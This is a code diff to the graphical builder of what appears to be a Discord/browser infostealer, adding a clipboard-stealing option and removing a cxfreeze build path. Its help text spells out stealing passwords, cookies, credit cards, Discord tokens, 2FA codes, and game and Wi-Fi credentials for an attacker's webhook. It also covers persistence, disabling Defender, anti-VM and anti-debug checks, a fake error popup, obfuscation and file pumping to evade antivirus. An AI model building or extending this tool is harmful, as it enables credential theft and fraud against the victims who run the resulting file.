@@ -54,7 +54,7 @@ class App(customtkinter.CTk):
             "antidebug_vm": False,
             "discord": False,
             "anti_spam": False,
-            "self_destruct": False
+            "self_destruct": False,
         }
 
         image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "./gui_images/")
@@ -110,122 +110,126 @@ class App(customtkinter.CTk):
 
         self.ping = customtkinter.CTkCheckBox(self.builder_frame, text="Ping", font=customtkinter.CTkFont(size=17, family=self.font),
                                               command=self.check_ping, fg_color="#5d11c3", hover_color="#5057eb")
-        self.ping.grid(row=1, column=0, sticky="nw", padx=85, pady=160)
+        self.ping.grid(row=1, column=0, sticky="nw", padx=85, pady=150)
 
         self.pingtype = customtkinter.CTkOptionMenu(
             self.builder_frame, width=20, values=["Everyone", "Here"],
             font=customtkinter.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96")
         self.pingtype.set(value="Here")
-        self.pingtype.grid(row=1, column=0, sticky="nw", padx=160, pady=158)
+        self.pingtype.grid(row=1, column=0, sticky="nw", padx=160, pady=148)
         self.pingtype.configure(state="disabled")
 
         self.error = customtkinter.CTkCheckBox(self.builder_frame, text="Fake Error", font=customtkinter.CTkFont(
             size=17, family=self.font), fg_color="#5d11c3", hover_color="#5057eb")
-        self.error.grid(row=1, column=0, sticky="nw", padx=85, pady=115)
+        self.error.grid(row=1, column=0, sticky="nw", padx=85, pady=105)
 
         self.startup = customtkinter.CTkCheckBox(
             self.builder_frame, text="Add To Startup", font=customtkinter.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
-        self.startup.grid(row=1, column=0, sticky="nw", padx=85, pady=70)
+        self.startup.grid(row=1, column=0, sticky="nw", padx=85, pady=60)
 
         self.defender = customtkinter.CTkCheckBox(
             self.builder_frame, text="Disable Defender", font=customtkinter.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
-        self.defender.grid(row=1, column=0, sticky="nw", padx=286, pady=70)
+        self.defender.grid(row=1, column=0, sticky="nw", padx=286, pady=60)
 
         self.killprotector = customtkinter.CTkCheckBox(
             self.builder_frame, text="Kill Protector", font=customtkinter.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
-        self.killprotector.grid(row=1, column=0, sticky="nw", padx=286, pady=115)
+        self.killprotector.grid(row=1, column=0, sticky="nw", padx=286, pady=105)
 
         self.antidebug_vm = customtkinter.CTkCheckBox(
             self.builder_frame, text="Anti Debug/Vm", font=customtkinter.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
-        self.antidebug_vm.grid(row=1, column=0, sticky="nw", padx=286, pady=160)
+        self.antidebug_vm.grid(row=1, column=0, sticky="nw", padx=286, pady=150)
 
         self.discord = customtkinter.CTkCheckBox(
             self.builder_frame, text="Discord Info", font=customtkinter.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
-        self.discord.grid(row=1, column=0, sticky="ne", padx=110, pady=70)
+        self.discord.grid(row=1, column=0, sticky="ne", padx=110, pady=60)
 
         self.wifi = customtkinter.CTkCheckBox(self.builder_frame, text="Wifi Info", font=customtkinter.CTkFont(size=17, family=self.font),
                                               fg_color="#5d11c3", hover_color="#5057eb")
-        self.wifi.grid(row=1, column=0, sticky="ne", padx=130, pady=115)
+        self.wifi.grid(row=1, column=0, sticky="ne", padx=130, pady=105)
 
         self.minecraft = customtkinter.CTkCheckBox(
             self.builder_frame, text="Minecraft Info", font=customtkinter.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
-        self.minecraft.grid(row=1, column=0, sticky="ne", padx=99, pady=160)
+        self.minecraft.grid(row=1, column=0, sticky="ne", padx=99, pady=150)
 
         self.systeminfo = customtkinter.CTkCheckBox(
             self.builder_frame, text="System Info", font=customtkinter.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
-        self.systeminfo.grid(row=1, column=0, sticky="nw", padx=85, pady=205)
+        self.systeminfo.grid(row=1, column=0, sticky="nw", padx=85, pady=195)
 
         self.backupcodes = customtkinter.CTkCheckBox(
             self.builder_frame, text="2FA Codes", font=customtkinter.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
-        self.backupcodes.grid(row=1, column=0, sticky="nw", padx=286, pady=205)
+        self.backupcodes.grid(row=1, column=0, sticky="nw", padx=286, pady=195)
 
         self.browser = customtkinter.CTkCheckBox(
             self.builder_frame, text="Browser Info", font=customtkinter.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
-        self.browser.grid(row=1, column=0, sticky="ne", padx=107, pady=205)
+        self.browser.grid(row=1, column=0, sticky="ne", padx=107, pady=195)
 
         self.roblox = customtkinter.CTkCheckBox(self.builder_frame, text="Roblox Info", font=customtkinter.CTkFont(size=17, family=self.font),
                                                 fg_color="#5d11c3", hover_color="#5057eb", command=self.check_roblox)
-        self.roblox.grid(row=1, column=0, sticky="nw", padx=85, pady=250)
+        self.roblox.grid(row=1, column=0, sticky="nw", padx=85, pady=240)
 
         self.obfuscation = customtkinter.CTkCheckBox(
             self.builder_frame, text="Obfuscation", font=customtkinter.CTkFont(size=17, family=self.font),
-            fg_color="#5d11c3", hover_color="#5057eb", command=self.check_cxfreeze)
-        self.obfuscation.grid(row=1, column=0, sticky="nw", padx=286, pady=250)
+            fg_color="#5d11c3", hover_color="#5057eb")
+        self.obfuscation.grid(row=1, column=0, sticky="nw", padx=286, pady=240)
 
         self.injection = customtkinter.CTkCheckBox(
             self.builder_frame, text="Injection", font=customtkinter.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
-        self.injection.grid(row=1, column=0, sticky="ne", padx=130, pady=250)
+        self.injection.grid(row=1, column=0, sticky="ne", padx=130, pady=240)
 
         self.antispam = customtkinter.CTkCheckBox(self.builder_frame, text="Anti Spam", font=customtkinter.CTkFont(size=17, family=self.font),
                                                   fg_color="#5d11c3", hover_color="#5057eb")
-        self.antispam.grid(row=1, column=0, sticky="nw", padx=85, pady=295)
+        self.antispam.grid(row=1, column=0, sticky="nw", padx=85, pady=285)
 
         self.self_destruct = customtkinter.CTkCheckBox(self.builder_frame, text="Self Destruct", font=customtkinter.CTkFont(size=17, family=self.font),
                                                        fg_color="#5d11c3", hover_color="#5057eb")
-        self.self_destruct.grid(row=1, column=0, sticky="nw", padx=286, pady=295)
+        self.self_destruct.grid(row=1, column=0, sticky="nw", padx=286, pady=285)
 
         self.pump = customtkinter.CTkCheckBox(self.builder_frame, text="File Pumper", font=customtkinter.CTkFont(size=17, family=self.font),
                                               fg_color="#5d11c3", hover_color="#5057eb", command=self.check_pumper)
-        self.pump.grid(row=1, column=0, sticky="ne", padx=112, pady=295)
+        self.pump.grid(row=1, column=0, sticky="ne", padx=112, pady=285)
 
         self.pump_size = customtkinter.CTkOptionMenu(self.builder_frame, width=30, font=customtkinter.CTkFont(
             size=17, family=self.font), values=["5mb", "10mb", "15mb", "20mb", "25mb", "30mb"], fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96")
-        self.pump_size.grid(row=1, column=0, sticky="ne", padx=28, pady=294)
+        self.pump_size.grid(row=1, column=0, sticky="ne", padx=28, pady=284)
         self.pump_size.set("10mb")
         self.pump_size.configure(state="disabled")
 
-        self.fileopts = customtkinter.CTkOptionMenu(self.builder_frame, values=["pyinstaller", "cxfreeze", ".py"],
+        self.clipboard = customtkinter.CTkCheckBox(self.builder_frame, text="Clipboard", font=customtkinter.CTkFont(size=17, family=self.font),
+                                                fg_color="#5d11c3", hover_color="#5057eb")
+        self.clipboard.grid(row=1, column=0, sticky="nw", padx=286, pady=328)
+
+        self.fileopts = customtkinter.CTkOptionMenu(self.builder_frame, values=["pyinstaller", ".py"],
                                                     font=customtkinter.CTkFont(size=32, family=self.font), width=250, height=45,
                                                     fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96", command=self.multi_commands)
-        self.fileopts.grid(row=1, column=0, sticky="nw", padx=85, pady=340)
+        self.fileopts.grid(row=1, column=0, sticky="nw", padx=85, pady=365)
         self.fileopts.set("File Options")
 
         self.icon = customtkinter.CTkButton(self.builder_frame, width=250, text="Add Icon", fg_color="#5d11c3", hover_color="#5057eb",
                                             font=customtkinter.CTkFont(size=33, family=self.font), command=self.get_icon)
-        self.icon.grid(row=1, column=0, sticky="ne", padx=85, pady=340)
+        self.icon.grid(row=1, column=0, sticky="ne", padx=85, pady=365)
         self.icon.configure(state="disabled")
 
         self.filename = customtkinter.CTkEntry(self.builder_frame, width=250, font=customtkinter.CTkFont(size=33, family=self.font),
                                                placeholder_text="File Name")
-        self.filename.grid(row=1, column=0, sticky="nw", padx=85, pady=410)
+        self.filename.grid(row=1, column=0, sticky="nw", padx=85, pady=420)
 
         self.build = customtkinter.CTkButton(self.builder_frame, width=250, text="Build", font=customtkinter.CTkFont(size=35, family=self.font),
                                              fg_color="#5d11c3", hover_color="#5057eb", command=self.buildfile)
-        self.build.grid(row=1, column=0, sticky="ne", padx=85, pady=410)
+        self.build.grid(row=1, column=0, sticky="ne", padx=85, pady=420)
 
         self.checkboxes = [self.ping, self.pingtype, self.error, self.startup, self.defender, self.systeminfo, self.backupcodes, self.browser,
-                           self.roblox, self.obfuscation, self.injection, self.minecraft, self.wifi, self.killprotector, self.antidebug_vm, self.discord]
+                           self.roblox, self.obfuscation, self.injection, self.minecraft, self.wifi, self.killprotector, self.antidebug_vm, self.discord, self.clipboard]
 
         for checkbox in self.checkboxes:
             checkbox.bind("<Button-1>", self.update_config)
@@ -242,7 +246,7 @@ class App(customtkinter.CTk):
         self.docsbox.grid(row=1, column=0, sticky="n", padx=0, pady=55)
         self.docsbox.insert(
             "0.0",
-            "Add To Startup:\nThis will add the file to the startup folder of the user so when they turn their pc on the file will run and their information will \nbe sent to your webhook again.\n\nFake Error:\nThis will make a fake error popup when the file is ran to make confuse the victim.\n\nPing:\nThis will ping you at the moment when information is being sent to your webhook.\n\nPing Type:\nThere are two options: @everyone and @here. @everyone pings everyone that can access that channel and @here pings \nactive people in that channel\n\nSystem Info:\nThis will get the user's pc information such as pc name, os, ip address, mac address, hwid, cpu, gpu and ram.\n\n2FA Codes:\nThis will get the user's discord authentification codes.\n\nBrowser Info:\nThis will get the user's browser such as browser passwords, history, cookies and credit cards.\n\nRoblox Info:\nThis will get the user's roblox information like there username, roblox cookie and the amount of robux they have.\n\nObfuscation:\nThis will obfuscate the file which means the source code will be unreadable and it will be hard for your victim's to delete or \nspam your webhook.\n\nInjection:\nThis will inject a script into your victim's discord which means when they change any credentials you will recieve their \npassword and token to that discord account.\n\nMinecraft Info:\nThis will get the user's minecraft information such as their session info and user cache.\n\nWifi Info:\nThis will get the user's wifi information such as wifi passwords and wifi networks.\n\nKill Protector:\nThis will kill a discord protector that some people use so their token can't be taken but this bypasses that.\n\nAnti-Debug VM:\nThis will check if the user is using a virtual machine or if they are debugging this script and it will exit out to stop them.\n\nDiscord Info:\nThis will send you all the discord information for every account they have. This info consists of their email, phone number, if \nthey have 2fa enabled, if they have nitro and what type of nitro, token and any gift cards.\n\nAnti Spam:\nOnly allows the victim to open the file every 60 seconds so your webhook isnt rate limited or spammed.\n\nSelf Destruct:\nDeletes the file once it has ran so the victim can't run it again.\n\nFile Pumper:\nAdds more megabytes to the file to make the file appear to be something its not and also tricks some antiviruses.\n\nBuild Options:\nPyinstaller - Builds a standalone executable file with the necessary modules inside of it.\nAdvantages: Single file, fast compilation time, easy to transfer.\nDisadvantages: Detected by antiviruses, large file size\n\nCxfreeze - Builds a executable file and frozen modules that have to be together for the executable to work\nAdvantages: Smaller file size, basically fully undetectable\nDisadvantages: Multiple files, slower compilation time, looks more suspicious")
+            "Add To Startup:\nThis will add the file to the startup folder of the user so when they turn their pc on the file will run and their information will \nbe sent to your webhook again.\n\nFake Error:\nThis will make a fake error popup when the file is ran to make confuse the victim.\n\nPing:\nThis will ping you at the moment when information is being sent to your webhook.\n\nPing Type:\nThere are two options: @everyone and @here. @everyone pings everyone that can access that channel and @here pings \nactive people in that channel\n\nSystem Info:\nThis will get the user's pc information such as pc name, os, ip address, mac address, hwid, cpu, gpu and ram.\n\n2FA Codes:\nThis will get the user's discord authentification codes.\n\nBrowser Info:\nThis will get the user's browser such as browser passwords, history, cookies and credit cards.\n\nRoblox Info:\nThis will get the user's roblox information like there username, roblox cookie and the amount of robux they have.\n\nObfuscation:\nThis will obfuscate the file which means the source code will be unreadable and it will be hard for your victim's to delete or \nspam your webhook.\n\nInjection:\nThis will inject a script into your victim's discord which means when they change any credentials you will recieve their \npassword and token to that discord account.\n\nMinecraft Info:\nThis will get the user's minecraft information such as their session info and user cache.\n\nWifi Info:\nThis will get the user's wifi information such as wifi passwords and wifi networks.\n\nKill Protector:\nThis will kill a discord protector that some people use so their token can't be taken but this bypasses that.\n\nAnti-Debug VM:\nThis will check if the user is using a virtual machine or if they are debugging this script and it will exit out to stop them.\n\nDiscord Info:\nThis will send you all the discord information for every account they have. This info consists of their email, phone number, if \nthey have 2fa enabled, if they have nitro and what type of nitro, token and any gift cards.\n\nAnti Spam:\nOnly allows the victim to open the file every 60 seconds so your webhook isnt rate limited or spammed.\n\nSelf Destruct:\nDeletes the file once it has ran so the victim can't run it again.\n\nFile Pumper:\nAdds more megabytes to the file to make the file appear to be something its not and also tricks some antiviruses.\n\nClipboard:\nRetrieves the last thing they copied onto their clipboard.\n\nBuild Options:\nPyinstaller - Builds a standalone executable file with the necessary modules inside of it.\nAdvantages: Single file, fast compilation time, easy to transfer.\nDisadvantages: Detected by antiviruses, large file size\n\nCxfreeze - Builds a executable file and frozen modules that have to be together for the executable to work\nAdvantages: Smaller file size, basically fully undetectable\nDisadvantages: Multiple files, slower compilation time, looks more suspicious")
 
         self.select_frame_by_name("home")
 
@@ -307,9 +311,6 @@ class App(customtkinter.CTk):
     def multi_commands(self, value):
         if value == "pyinstaller":
             self.check_icon()
-        elif value == "cxfreeze":
-            self.check_cxfreeze()
-            self.check_icon()
         elif value == ".py":
             self.check_icon()
 
@@ -325,15 +326,8 @@ class App(customtkinter.CTk):
     def check_icon(self):
         if self.fileopts.get() == "pyinstaller":
             self.icon.configure(state="normal")
-        elif self.fileopts.get() == "cxfreeze":
-            self.icon.configure(state="normal")
         elif self.fileopts.get() == ".py":
             self.icon.configure(state="disabled")
-
-    def check_cxfreeze(self):
-        if self.fileopts.get() == "cxfreeze":
-            if self.obfuscation.get() == 1:
-                self.obfuscation.deselect()
 
     def get_icon(self):
         self.iconpath = filedialog.askopenfilename(initialdir="/", title="Select Icon", filetypes=(("ico files", "*.ico"), ("all files", "*.*")))
@@ -364,7 +358,8 @@ class App(customtkinter.CTk):
             "antidebug_vm": self.antidebug_vm,
             "discord": self.discord,
             "anti_spam": self.antispam,
-            "self_destruct": self.self_destruct
+            "self_destruct": self.self_destruct,
+            "clipboard": self.clipboard
         }
 
         for key, checkbox in checkbox_mapping.items():
@@ -416,7 +411,7 @@ class App(customtkinter.CTk):
 
     def return_filename(self):
         try:
-            get_file_name = self.filename.get()
+            get_file_name = self.filename.get().replace(" ", "-")
             if not get_file_name:
                 random_name = ''.join(random.choices(string.ascii_letters, k=5))
                 logging.info(f"Retrieved filename: test-{random_name}")
@@ -481,40 +476,14 @@ class App(customtkinter.CTk):
                                 "--hidden-import", "psutil",
                                 "--hidden-import", "PIL",
                                 "--hidden-import", "PIL.ImageGrab",
+                                "--hidden-import", "PIL.Image",
                                 "--hidden-import", "Cryptodome",
                                 "--hidden-import", "Cryptodome.Cipher",
                                 "--hidden-import", "Cryptodome.Cipher.AES",
                                 "--hidden-import", "win32crypt",
                                 "--icon", exeicon, f"./{filename}.py"])
+                
                 logging.info(f"Successfully compiled {filename}.exe with pyinstaller")
-
-            elif filetype == "cxfreeze":
-                cmd_args = [
-                    "cxfreeze",
-                    f"{filename}.py",
-                    "--target-name", filename,
-                    "--base-name", "Win32GUI",
-                    "--includes", "base64",
-                    "--includes", "ctypes",
-                    "--includes", "json",
-                    "--includes", "re",
-                    "--includes", "time",
-                    "--includes", "subprocess",
-                    "--includes", "sys",
-                    "--includes", "sqlite3",
-                    "--includes", "requests_toolbelt",
-                    "--includes", "psutil",
-                    "--includes", "PIL",
-                    "--includes", "PIL.ImageGrab",
-                    "--includes", "Cryptodome",
-                    "--includes", "Cryptodome.Cipher",
-                    "--includes", "Cryptodome.Cipher.AES",
-                    "--includes", "win32crypt"
-                ]
-                if exeicon != "NONE":
-                    cmd_args += ["--icon", exeicon]
-                subprocess.run(cmd_args)
-                logging.info(f"Successfully compiled {filename}.exe with cxfreeze")
         except Exception as e:
             logging.error(f"Error with compiling file: {e}")
 
@@ -581,19 +550,6 @@ class App(customtkinter.CTk):
                 self.builder_frame.after(3000, self.reset_build_button)
                 self.cleanup_files(filename)
 
-            elif self.get_filetype() == "cxfreeze":
-                self.write_and_obfuscate(filename)
-
-                thread = threading.Thread(target=self.compile_file, args=(filename, "cxfreeze",))
-                thread.start()
-                self.building_button_thread(thread)
-
-                if self.pump.get() == 1:
-                    self.file_pumper(filename, "exe", self.get_mb())
-
-                self.built_file()
-                self.builder_frame.after(3000, self.reset_build_button)
-                os.remove(f"./{filename}.py")
         except Exception as e:
             logging.error(f"Error with building file: {e}")
 
